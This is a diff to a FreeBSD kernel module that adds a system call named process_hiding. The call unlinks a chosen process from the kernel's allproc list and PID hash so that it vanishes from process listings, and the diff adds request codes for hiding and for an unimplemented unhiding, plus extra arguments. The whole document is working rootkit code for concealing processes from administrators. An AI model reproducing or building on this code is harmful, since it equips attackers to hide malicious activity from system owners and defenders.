@@ -11,8 +11,13 @@
 #include <sys/sx.h>
 #include <sys/queue.h>
 
+#define REQ_HIDE 1000
+#define REQ_UNHIDE 2000
+
 struct process_hiding_args {
-	pid_t p_pid;
+	long req;
+	long p_pid;
+	struct proc *p_addr;
 };
 
 static int process_hiding(struct thread *td, void *syscall_args) {
@@ -20,24 +25,31 @@ static int process_hiding(struct thread *td, void *syscall_args) {
 	uap = (struct process_hiding_args *)syscall_args;
 
 	struct proc *p;
-	sx_xlock(&allproc_lock);
-	LIST_FOREACH(p, PIDHASH(uap->p_pid), p_hash) {
-		if (p->p_pid == uap->p_pid) {
-			PROC_LOCK(p);
-			LIST_REMOVE(p, p_list);
-			LIST_REMOVE(p, p_hash);
-			PROC_UNLOCK(p);
-			uprintf("Hiding process %d '%s'\n", p->p_pid, p->p_comm);
-		}
-	}
 
-	sx_xunlock(&allproc_lock);
+	if (uap->req == REQ_HIDE) {
+		sx_xlock(&allproc_lock);
+
+		LIST_FOREACH(p, PIDHASH(uap->p_pid), p_hash) {
+			if (p->p_pid == uap->p_pid) {
+				LIST_REMOVE(p, p_list);
+				LIST_REMOVE(p, p_hash);
+				uprintf("Hiding process %d '%s' (%p)\n",
+					p->p_pid, p->p_comm, p);
+			}
+		}
+
+		sx_xunlock(&allproc_lock);
+	} else if (uap->req == REQ_UNHIDE) {
+		uprintf("Unhide is unimplemented!\n");
+	} else {
+		uprintf("Unknown request code!\n");
+	}
 
 	return 0;
 }
 
 static struct sysent syscall_sysent = {
-	.sy_narg = 1,
+	.sy_narg = 3,
 	.sy_call = process_hiding
 };
 
